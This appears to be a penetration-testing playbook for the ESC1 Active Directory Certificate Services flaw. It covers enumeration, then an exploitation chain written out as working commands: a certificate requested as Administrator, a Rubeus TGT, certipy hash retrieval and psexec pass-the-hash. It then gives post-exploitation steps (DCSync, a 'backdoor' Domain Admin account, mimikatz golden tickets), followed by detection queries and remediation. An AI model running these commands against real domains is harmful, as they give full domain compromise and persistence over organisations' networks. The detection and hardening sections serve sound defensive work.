# ESC1 - Misconfigured Certificate Templates

## Attack Overview

ESC1 exploits misconfigured certificate templates that allow:
1. Client authentication (via EKU)
2. Enrollment rights for low-privileged users
3. The enrollee to specify a Subject Alternative Name (SAN)
4. Manager approval is NOT required

This allows an attacker to request a certificate as ANY user (including Domain Admins) and authenticate as them.

---

## Prerequisites

- Domain user credentials
- Network access to the Certificate Authority
- Vulnerable certificate template with:
  - `ENROLLEE_SUPPLIES_SUBJECT` flag enabled
  - `Client Authentication` EKU (OID: 1.3.6.1.5.5.7.3.2)
  - Enrollment rights for authenticated users/low-priv groups
  - No manager approval required
  - Not requiring authorized signatures

---

## Vulnerability Conditions

A template is vulnerable to ESC1 when ALL of the following are true:

```
✓ CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set (msPKI-Certificate-Name-Flag)
✓ Certificate has Client Authentication EKU
✓ Low-privileged users can enroll
✓ Manager approval is disabled
✓ Authorized signatures = 0
```

---

## Attack Chain

### Phase 1: Enumeration

#### Using Certify
```powershell
# Find all ESC1 vulnerable templates
.\Certify.exe find /vulnerable

# Specific ESC1 check
.\Certify.exe find /vulnerable /currentuser
```

**Example vulnerable output:**
```
[*] Template Name: VulnerableUserTemplate
    Template Permissions:
      NT AUTHORITY\Authenticated Users: Enroll
    Manager Approval: Disabled
    Required Signatures: 0
    Application Policies: Client Authentication
    Enrollment Flag: ENROLLEE_SUPPLIES_SUBJECT
    Vulnerabilities: ESC1
```

#### Using Certipy (Linux/Python)
```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout
```

#### Using PowerShell (Manual)
```powershell
# Import AD module
Import-Module ActiveDirectory

# Get certificate templates
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$Templates = Get-ADObject -SearchBase $TemplatesPath -Filter * -Properties *

# Check for ESC1 conditions
foreach ($Template in $Templates) {
    $NameFlag = $Template.'msPKI-Certificate-Name-Flag'
    $EKUs = $Template.'msPKI-Certificate-Application-Policy'

    # Check ENROLLEE_SUPPLIES_SUBJECT flag (0x1)
    if ($NameFlag -band 0x1) {
        # Check for Client Authentication EKU
        if ($EKUs -contains "1.3.6.1.5.5.7.3.2") {
            Write-Host "[!] Potential ESC1: $($Template.Name)" -ForegroundColor Red
        }
    }
}
```

---

### Phase 2: Exploitation

#### Step 1: Request Certificate with Arbitrary SAN

Using **Certify.exe**:
```powershell
# Request certificate for Domain Admin
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:VulnerableUserTemplate /altname:Administrator

# For different user
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:VulnerableUserTemplate /altname:DomainAdmin
```

**Expected Output:**
```
[*] Action: Request a Certificates
[*] Current user context: CORP\lowprivuser
[*] Template: VulnerableUserTemplate
[*] Subject: CN=lowprivuser, CN=Users, DC=corp, DC=local
[*] AltName: Administrator

[*] Certificate request response:
-----BEGIN RSA PRIVATE KEY-----
[base64 encoded private key]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[base64 encoded certificate]
-----END CERTIFICATE-----
```

#### Step 2: Convert to PFX Format

```powershell
# Save certificate and key to files
$cert = @"
-----BEGIN CERTIFICATE-----
[paste certificate]
-----END CERTIFICATE-----
"@ | Out-File cert.pem

$key = @"
-----BEGIN RSA PRIVATE KEY-----
[paste key]
-----END RSA PRIVATE KEY-----
"@ | Out-File key.pem

# Convert using OpenSSL
openssl pkcs12 -in cert.pem -inkey key.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx
```

**OR use Certify's built-in conversion:**
```powershell
# Certify can output PFX directly
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:VulnerableUserTemplate /altname:Administrator /pfx:administrator.pfx
```

#### Step 3: Authenticate with Certificate

Using **Rubeus** (Kerberos authentication):
```powershell
# Request TGT using certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:password /ptt

# Or get base64 encoded TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:password /nowrap
```

**Expected Output:**
```
[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=lowprivuser
[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF[...]

  ServiceName: krbtgt/corp.local
  ServiceRealm: CORP.LOCAL
  UserName: Administrator
  UserRealm: CORP.LOCAL
  StartTime: 11/16/2025 10:30:00 PM
  EndTime: 11/17/2025 8:30:00 AM
  RenewTill: 11/23/2025 10:30:00 PM
  Flags: name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType: rc4_hmac
  Base64(key): [key]
[+] Ticket successfully imported!
```

Using **Certipy** (NTLM hash retrieval):
```bash
# Authenticate and retrieve NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Use the hash with Pass-the-Hash
impacket-psexec -hashes :7a21990fcd3d759941e45c490f143d5f administrator@10.10.10.10
```

---

### Phase 3: Post-Exploitation

#### Option 1: DCSync Attack
```powershell
# Import Mimikatz or use Rubeus DCSync
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

#### Option 2: Create New Domain Admin
```powershell
# Create persistence account
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

#### Option 3: Golden Ticket
```powershell
# Extract krbtgt hash first via DCSync
# Then create golden ticket
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:[hash] /ptt" exit
```

---

## Detection

### Event Logs to Monitor

**Security Event 4886** - Certificate Request
```xml
EventID: 4886
Task Category: Certificate Services
Keywords: Audit Success
Message: Certificate Services received a certificate request
Look for: Mismatched requester vs. SAN attributes
```

**Security Event 4887** - Certificate Issued
```xml
EventID: 4887
Look for:
  - SAN containing privileged account names
  - Requester != Certificate Subject
```

**Security Event 4768** - Kerberos TGT Request
```xml
EventID: 4768
Look for:
  - Pre-authentication type: Public Key (PKINIT = 16)
  - Account name: Privileged accounts
  - Certificate information in ticket request
```

### Detection Queries

#### Splunk
```spl
index=windows EventCode=4887
| rex field=Message "Request ID:\s+(?<RequestID>\d+)"
| rex field=Message "Requester:\s+(?<Requester>[^\n]+)"
| rex field=Message "Subject:\s+(?<Subject>[^\n]+)"
| where Requester != Subject
| table _time, Requester, Subject, RequestID
```

#### KQL (Azure Sentinel / Defender)
```kql
SecurityEvent
| where EventID == 4887
| extend Requester = extract("Requester:\\s+([^\\n]+)", 1, EventData)
| extend Subject = extract("Subject:\\s+([^\\n]+)", 1, EventData)
| where Requester != Subject
| project TimeGenerated, Requester, Subject, Computer
```

### Sigma Rule
```yaml
title: ESC1 Certificate Request with Arbitrary SAN
description: Detects certificate requests where requester differs from subject
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887
  condition: selection and (Requester != CertificateSubject)
level: high
```

---

## Remediation

### Immediate Actions

1. **Disable Vulnerable Templates**
```powershell
# Disable template enrollment
$Template = Get-ADObject -Filter {cn -eq "VulnerableUserTemplate"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)"
Set-ADObject $Template -Replace @{"flags"="130"}  # CT_FLAG_DISABLED
```

2. **Revoke Suspicious Certificates**
```powershell
# On CA server
certutil -revoke [serial-number] [reason]
# reason: 1 = KeyCompromise
```

### Long-Term Hardening

1. **Remove ENROLLEE_SUPPLIES_SUBJECT Flag**
```powershell
# On CA server / ADSI Edit
# Remove msPKI-Certificate-Name-Flag value 0x1
certutil -dsTemplate VulnerableUserTemplate
# Edit and remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
```

2. **Restrict Template Enrollment**
```powershell
# Allow only specific security groups
# Remove: NT AUTHORITY\Authenticated Users
# Add: Specific groups requiring certificates
```

3. **Enable Manager Approval**
```
Certificate Templates Console:
Template Properties → Issuance Requirements
☑ CA certificate manager approval
```

4. **Require Authorized Signatures**
```
Certificate Templates Console:
Template Properties → Issuance Requirements
Number of authorized signatures required: 1
```

---

## Prevention Best Practices

### Template Security Checklist

- [ ] ENROLLEE_SUPPLIES_SUBJECT disabled for privileged authentication
- [ ] Enrollment restricted to specific groups (not Authenticated Users)
- [ ] Manager approval enabled for sensitive templates
- [ ] Authorized signatures required where appropriate
- [ ] Regular template audits performed
- [ ] Certificate issuance monitoring enabled
- [ ] PKINIT authentication logged and monitored

### Audit Script
```powershell
# Run periodically
.\scripts\defense\Audit-CertTemplates.ps1 -CheckESC1 -EmailReport -Recipients security@corp.local
```

---

## References

- [SpecterOps - Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certify - ESC1 Documentation](https://github.com/GhostPack/Certify)
- [Microsoft - Certificate Template Security](https://docs.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-security)

---

**Author**: ADCS Attack Research
**Last Updated**: November 2025
**Classification**: Authorized Security Testing Only
